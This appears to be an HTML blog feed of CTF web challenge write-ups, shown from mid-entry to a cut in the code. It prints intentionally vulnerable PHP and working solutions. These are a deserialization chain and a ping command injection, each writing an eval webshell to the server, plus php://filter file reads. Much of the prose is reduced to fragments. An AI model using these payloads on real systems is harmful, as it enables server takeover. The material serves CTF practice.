keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$useless</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("+Genshin Impact Start!+");?>'</span><span class="token punctuation">;</span>        <span class="token variable">$useful</span><span class="token operator">=</span> <span class="token variable">$useless</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">part2</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span> <span class="token property">part1</span><span class="token punctuation">,</span><span class="token variable">$useful</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./flag,php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"barking for fun!"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no way, fuck off"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><blockquote><p>Start-&gt;CTF-&gt;Flag</p></blockquote><p>exp:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$barking</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">-></span><span class="token function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$part1</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$part2</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part1</span> <span class="token operator">=</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part2</span> <span class="token operator">=</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$useless</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("+Genshin Impact Start!+");?>'</span><span class="token punctuation">;</span>        <span class="token variable">$useful</span><span class="token operator">=</span> <span class="token variable">$useless</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">part2</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span> <span class="token property">part1</span><span class="token punctuation">,</span><span class="token variable">$useful</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./flag,php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"barking for fun!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">part1</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">part2</span><span class="token operator">=</span><span class="token string single-quoted-string">'PD8gZXZhbCgkX1BPU1RbMV0pOw=='</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame-2023</title>
      <link href="/2023/10/06/0xGame-2023/"/>
      <url>/2023/10/06/0xGame-2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h2><p>F12main.jsflag<br><img src="https://img-blog.csdnimg.cn/0f8d7e6202574ec0a759d419ed97bf7b.png" alt="1"></p><h2 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// flag in flag.php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span> <span class="token operator">!=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>a,bnamephp<code>php://filter/convert.base64-encode/resource=flag</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span> <span class="token operator">!=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>c1024.1a</p><h2 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h2><p></p><h2 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h2><p><img src="https://img-blog.csdnimg.cn/4a66a3f4f0c949cc82de767ad82aa088.png" alt="1"><br>ping<br><strong>&#x2F;api.php?source</strong><br><img src="https://img-blog.csdnimg.cn/d5e483c94b15420989adff91a42f44bb.png" alt="1"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">sanitize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No IP Address'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//ip</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid IP Address'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping -c 4 '</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span> <span class="token string single-quoted-string">' 2>&amp;1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ip<br><img src="https://img-blog.csdnimg.cn/0000633d27ea4222bd497e48dc1922be.png" alt="2"><br><code>ip=127.0.0.1|ls``ip=127.0.0.10000||ls</code><br><img src="https://img-blog.csdnimg.cn/480d98ce0ba9467fa140c77c5dd89dd9.png" alt="1"><br><code>$&#123;IFS&#125;</code>base64</p><blockquote><p><code>echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2N0ZiddKTsgPz4=|base64$&#123;IFS&#125;-d&gt;&gt;513.php</code></p></blockquote><p>flag<br><img src="https://img-blog.csdnimg.cn/f521f056cd724f2f8e85d9b2a945a12f.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF-2023</title>
      <link href="/2023/10/06/NewStarCTF-2023/"/>
      <url>/2023/10/06/NewStarCTF-2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="week1-web"><a href="#week1-web" class="headerlink" title="week1-web"></a>week1-web</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>robots.txt+<a href="http://www.zip/">www.zip</a></strong> flag</p><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p><img src="https://img-blog.csdnimg.cn/0438e24d7ed54a9d8c4375b2347ea9a6.png" alt="1"><br>flag<br><img src="https://img-blog.csdnimg.cn/5a0f93ee0a904b79b076100d8c03dfe9.png" alt="5"></p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>GETctf&#x3D;1secret&#x3D;1<br><img src="https://img-blog.csdnimg.cn/c50cefbdd8e64ff3b2152524b7413d18.png" alt="1"><br>secret<strong>n3wst4rCTF2023g00000d</strong><br><img src="https://img-blog.csdnimg.cn/7f5108c2a098479c9fb5b88b15f62d94.png" alt="5"><br>cookiepower<strong>ctfer</strong><br>UA<strong>NewStarCTF2023</strong><br>Referer<strong>newstarctf.com</strong><br>X-Real-Ip<strong>127.0.0.1</strong><br>flag<br><img src="https://img-blog.csdnimg.cn/2c6c547e81d44b5eb3fb30ccff29ed98.png" alt="123"></p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>flag<br><img src="https://img-blog.csdnimg.cn/51afcb55d57645e291489cc2d73b1685.png" alt="456"></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 1=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 2=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 3=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$flag3</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//</span><span class="token comment">//strcmp()00==0</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 4=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2023</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$flag4</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//!is_numeric</span><span class="token comment">//%00</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 5=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// -> flag5='.'</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" 